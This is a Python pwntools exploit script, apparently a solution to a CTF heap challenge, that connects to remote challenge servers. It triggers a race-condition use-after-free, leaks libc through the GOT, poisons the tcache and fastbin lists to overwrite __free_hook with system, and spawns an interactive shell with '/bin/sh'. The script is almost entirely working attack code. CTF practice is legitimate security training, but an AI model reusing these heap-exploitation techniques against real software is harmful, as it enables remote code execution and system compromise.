import os
import sys
import time
from pwn import *

#p = process('./a.out', stderr=sys.stderr)
p = remote('54.164.45.235', 1337)
#p = remote('172.105.153.80', 1337)
#p = remote('out-of-order.chal.perfect.blue', 1337)

def do_pow():
    p.recvuntil("PoW: Give me x where sha256('")
    nonce = p.recvn(15)
    p.recvline()
    print(nonce)
    solver = process('./pow')
    solver.sendline(nonce)
    solution = solver.recvall()
    print(solution)
    p.sendline(solution)
#do_pow()

RACE_SIZE = 10000

def examine_results():
    time.sleep(1.0)
    p.sendline(b'3')
    x = p.recvuntil(b'results:\n')
    n_results = int(re.search(rb'(\d+) results:', x).group(1))
    print('%d results' % n_results)
    shid = p.recvuntil(b'Choose a result: #')
    shid = shid.split(b'\n')
    assert len(shid) == RACE_SIZE+1
    shid = shid[:-1]
    results = [None]*RACE_SIZE
    for i, l in enumerate(shid):
        l = l[1:].rstrip().split(b': ')
        assert int(l[0]) == i
        results[i] = l[1]
    # return to mainmenu
    p.sendline(b'0')
    p.recvline()
    p.sendline(b'1')
    p.recvline()
    p.recvline()
    p.recvline()
    return results

n_results = RACE_SIZE
def alloc(value):
    time.sleep(0.1)
    global n_results
    p.sendline(b'1')
    p.sendline(b'1')
    p.sendline(value)
    p.sendline(b'2')
    p.recvuntil(b' results\n')
    n_results += 1
    return n_results-1

def free(i):
    time.sleep(0.1)
    p.sendline(b'3')
    p.sendline(b'%d' % i)
    p.recvuntil(b'Choose a result: #')
    p.sendline(b'2')
    # p.recvuntil(b'Result deleted')

def read_back(i):
    time.sleep(0.1)
    p.sendline(b'3')
    p.sendline(b'%d' % i)
    p.recvuntil(b'Choose a result: #')
    p.sendline(b'1')
    p.recvuntil(b'Input: ')
    value = p.recvuntil(b'\n')[:-1]
    # print('Read back:', repr(value))
    return value

def spray():
    print('Sending race payload')
    p.send(b'1\n%d\n' % RACE_SIZE)
    p.send(race_payload)
    print('Racing done')
    p.sendline(b'2')

print('Generating payload')
race_payload = []
for i in range(RACE_SIZE):
    race_payload.append(b'%d\n' % i)
race_payload = b''.join(race_payload)

binary = ELF('./a.out')
libc = ELF('libc-2.31.so')

while True:
    spray()

    # check for dangling ptr
    results = examine_results()
    for i, s in enumerate(results):
        if s != (b'%d'%i):
            print('Double free detected! Result %d, was actually %s' % (i, s))
            uaf_one = i
            break
    else:
        print('No UAF')
        p.sendline(b'4')
        p.recvuntil(b'All saved results cleared\n')
        continue
    break

print('We have UAF on %d' % uaf_one)

uaf_str = results[uaf_one]
uaf_two = int(uaf_str) # if this isnt aliased to another Request object, we're fucked anyways
print('Overlapped chunks: results %d and %d' % (uaf_one, uaf_two))

tmp2 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
print('Free uaf 1')
free(uaf_one)
print('Free shield')
free(tmp2)
tmp3 = alloc(p64(binary.got['free']))
leak = u64(read_back(uaf_two).ljust(8, b'\x00'))
print('Leak:', hex(leak))
if not leak or leak & 0xf or (leak >> 32 != 0xffff):
    raise ValueError("bad leak");
libc_base = leak - libc.symbols['free']
if libc_base & 0xfff:
    raise ValueError('bad libc_base')
print('libc_base', hex(libc_base))
libc.address = libc_base
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
print('system()', hex(system))
print('free_hook', hex(free_hook))

# Leak some random heap chunk
free(tmp3)
tmp3 = alloc(p64(binary.symbols['wq'] + 8))
heap_leak = u64(read_back(uaf_two).ljust(8, b'\x00'))
print('Heap chunk leak:', hex(heap_leak))

# Write the heap chunk into uaf_two so we can free it without having glibc freaking the fuck out
free(tmp3)
tmp3 = alloc(p64(heap_leak))

# Fill tcache
print('Fill tcache...')
print(',')
tmp10 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp11 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp12 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp13 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp14 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp15 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp16 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
tmp17 = alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print(',')
free(tmp10)
print('.')
free(tmp11)
print('.')
free(tmp12)
print('.')
free(tmp13)
print('.')
free(tmp14)
print('.')
free(tmp15)
print('.')
free(tmp16)
print('.')

print('Lets go!')
free(uaf_two) # Goes to fastbin
print('Freed UAF2')
free(tmp17) # Avoid fasttop double free abort

# Drain tcache so that we can re-alloc tmp3 and smash the fastbin fd of freed UAF2
print('Drain tcache...')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
alloc(b'AAAAAAAAAAAAAAAAAAAAAAA')
print('tcache drained')

# Smash fastbin fd pointer
print('Overwrite fastbin fd...')
free(tmp3)
tmp3 = alloc(p64(free_hook-0x10))

# This will write our desired contents into free_hook
print('Overwrite free_hook')
alloc(p64(system))

# Trigger!
print('Trigger shell!')

free(alloc(b'/bin/sh'))

p.interactive()
